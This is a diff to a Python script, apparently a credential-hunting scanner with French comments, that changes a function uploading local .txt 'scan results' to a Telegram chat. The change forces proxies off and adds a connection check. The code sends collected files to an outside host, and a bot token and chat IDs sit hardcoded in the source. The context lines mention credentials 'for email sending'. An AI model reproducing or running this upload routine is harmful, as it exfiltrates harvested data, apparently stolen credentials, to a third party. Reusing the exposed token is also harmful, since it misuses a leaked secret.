@@ -2950,7 +2950,7 @@ You can use these credentials for email sending.
 # ==================== FONCTIONS UTILITAIRES ====================
 
 def send_results_to_telegram():
-    """📱 Envoi des résultats par Telegram"""
+    """📱 Envoi des résultats par Telegram SANS PROXY"""
     try:
         import requests
         from datetime import datetime
@@ -2958,14 +2958,18 @@ def send_results_to_telegram():
         
         timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
         
-        # Configuration Telegram - REMPLACE PAR TES VRAIES VALEURS
-        TELEGRAM_BOT_TOKEN = "6611453715:AAGdZ-77M3HzHMHtHSv5_-Wgrt2tUUXhP44"  # Token de @BotFather
-        TELEGRAM_CHAT_ID = "-1001945561814"     # Ton chat ID
+        # Configuration Telegram
+        TELEGRAM_BOT_TOKEN = "6611453715:AAGdZ-77M3HzHMHtHSv5_-Wgrt2tUUXhP44"  # Ton token
+        TELEGRAM_CHAT_ID = "-1002054520346"  # Tu dois le remplacer
         
-        # Détection environnement
-        environment = "Render" if os.environ.get('RENDER') else platform.system()
+        # Session sans proxy
+        session = requests.Session()
+        session.proxies = {}  # Forcer aucun proxy
+        session.trust_env = False  # Ignorer les variables d'environnement proxy
+        
+        environment = "Windows"
         print(f"🔍 Environment: {environment}")
-        print(f"📱 Sending files via Telegram...")
+        print(f"📱 Sending files via Telegram (NO PROXY)...")
         
         files_sent = 0
         files_found = 0
@@ -2984,6 +2988,22 @@ def send_results_to_telegram():
             print("⚠️ No .txt files found to send")
             return False
         
+        print(f"📊 Found {files_found} files ({total_size/1024:.1f} KB total)")
+        
+        # Test de connexion d'abord
+        test_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/getMe"
+        try:
+            test_response = session.get(test_url, timeout=10)
+            if test_response.status_code == 200:
+                bot_info = test_response.json()
+                print(f"✅ Bot connection OK: {bot_info['result']['first_name']}")
+            else:
+                print(f"❌ Bot test failed: {test_response.status_code}")
+                return False
+        except Exception as e:
+            print(f"❌ Cannot connect to Telegram: {e}")
+            return False
+        
         # Envoi du message de début
         start_message = f"🔥 <b>{environment} Scan Results</b>\n\n"
         start_message += f"📅 <b>Date:</b> {timestamp}\n"
@@ -2998,7 +3018,7 @@ def send_results_to_telegram():
             'parse_mode': 'HTML'
         }
         
-        start_response = requests.post(start_url, data=start_data, timeout=10)
+        start_response = session.post(start_url, data=start_data, timeout=15)
         if start_response.status_code != 200:
             print(f"❌ Failed to send start message: {start_response.status_code}")
             print(f"Response: {start_response.text}")
@@ -3014,25 +3034,17 @@ def send_results_to_telegram():
             try:
                 print(f"📤 Sending: {filename}")
                 
-                # Vérifier la taille du fichier
                 file_size = os.path.getsize(filename)
                 
-                if file_size > 50 * 1024 * 1024:  # 50MB max Telegram
-                    print(f"⚠️ File too large: {filename} ({file_size/1024/1024:.1f} MB)")
-                    # Envoyer un message d'erreur
-                    error_msg = f"❌ <b>{filename}</b> too large ({file_size/1024/1024:.1f} MB)\nMax size: 50 MB"
-                    requests.post(start_url, data={
-                        'chat_id': TELEGRAM_CHAT_ID,
-                        'text': error_msg,
-                        'parse_mode': 'HTML'
-                    }, timeout=10)
+                if file_size > 50 * 1024 * 1024:  # 50MB max
+                    print(f"⚠️ File too large: {filename}")
                     continue
                 
                 if file_size == 0:
                     print(f"⚠️ Empty file: {filename}")
                     continue
                 
-                # Préparer le caption
+                # Caption
                 caption = f"📄 <b>{filename}</b>\n"
                 caption += f"🌍 <b>Source:</b> {environment}\n"
                 caption += f"📊 <b>Size:</b> {file_size/1024:.1f} KB\n"
@@ -3049,7 +3061,7 @@ def send_results_to_telegram():
                         'parse_mode': 'HTML'
                     }
                     
-                    response = requests.post(send_url, data=data, files=files_data, timeout=30)
+                    response = session.post(send_url, data=data, files=files_data, timeout=60)
                 
                 if response.status_code == 200:
                     print(f"✅ Sent: {filename}")
@@ -3058,18 +3070,15 @@ def send_results_to_telegram():
                     print(f"❌ Failed to send {filename}: {response.status_code}")
                     print(f"Response: {response.text[:200]}")
                     
-                # Petit délai pour éviter le rate limiting
+                # Délai anti-spam
                 import time
-                time.sleep(1)
+                time.sleep(2)
                         
-            except requests.exceptions.Timeout:
-                print(f"❌ Timeout sending {filename}")
-                continue
             except Exception as e:
                 print(f"❌ Error sending {filename}: {e}")
                 continue
         
-        # Message de fin avec résumé
+        # Message de fin
         summary_message = f"📊 <b>Transfer Complete!</b>\n\n"
         summary_message += f"✅ <b>Files sent:</b> {files_sent}/{files_found}\n"
         summary_message += f"📈 <b>Success rate:</b> {(files_sent/max(1,files_found)*100):.1f}%\n"
@@ -3080,35 +3089,20 @@ def send_results_to_telegram():
         else:
             summary_message += f"❌ <b>No files were sent successfully</b>"
         
-        requests.post(start_url, data={
+        session.post(start_url, data={
             'chat_id': TELEGRAM_CHAT_ID,
             'text': summary_message,
             'parse_mode': 'HTML'
-        }, timeout=10)
+        }, timeout=15)
         
-        # Résumé final dans la console
         print(f"\n📊 TELEGRAM UPLOAD SUMMARY:")
-        print(f"   Environment:    {environment}")
-        print(f"   Files found:    {files_found}")
-        print(f"   Files sent:     {files_sent}")
+        print(f"   Files sent:     {files_sent}/{files_found}")
         print(f"   Success rate:   {(files_sent/max(1,files_found)*100):.1f}%")
         
-        if files_sent > 0:
-            print(f"\n🎉 SUCCESS! {files_sent} files sent to Telegram!")
-            print(f"📱 Check your Telegram bot for all files")
-            return True
-        else:
-            print(f"\n❌ FAILED! No files were sent successfully")
-            return False
+        return files_sent > 0
             
-    except ImportError as e:
-        print(f"❌ Missing required module: {e}")
-        print("💡 Try: pip install requests")
-        return False
     except Exception as e:
         print(f"❌ Critical error in Telegram upload: {e}")
-        import traceback
-        traceback.print_exc()
         return False
 
 def setup_signal_handlers(hunter):
